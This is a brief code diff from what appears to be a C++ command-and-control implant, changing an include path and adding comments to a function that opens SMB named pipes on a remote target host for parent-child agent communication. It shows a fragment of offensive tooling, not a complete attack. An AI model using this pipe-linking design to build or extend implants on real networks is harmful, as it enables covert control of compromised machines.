@@ -34,7 +34,7 @@ errors without relying on addtl branch logic. I try to use windows error  macro 
 #include "systems/childhandler.h"
 #include "comms/queues.h"
 #include "core/c2.h"
-#include "comms/smb.h"
+#include "protocols/smb/smb.h"
 #include "_debug/debug.h"
 #include "defense/winapi.h"
 //move to own file?
@@ -320,6 +320,10 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         //kinda fragile, should probably think about how to take bad pipe name input here
         //std::string raw_inbox = "\\\\.\\pipe\\" + args["inbox_pipe"].get<std::string>();
         //std::string raw_outbox = "\\\\.\\pipe\\" + args["outbox_pipe"].get<std::string>();
+
+        //note - this should be updated to use the strat name of the pipes instead of what is passed in
+        //or, server can track this. decision for later. 
+        //this is parent side
         std::string target_host = args["target"];
         std::string raw_inbox = "\\\\" + target_host + "\\pipe\\" + args["inbox_pipe"].get<std::string>();
         std::string raw_outbox = "\\\\" + target_host + "\\pipe\\" + args["outbox_pipe"].get<std::string>();
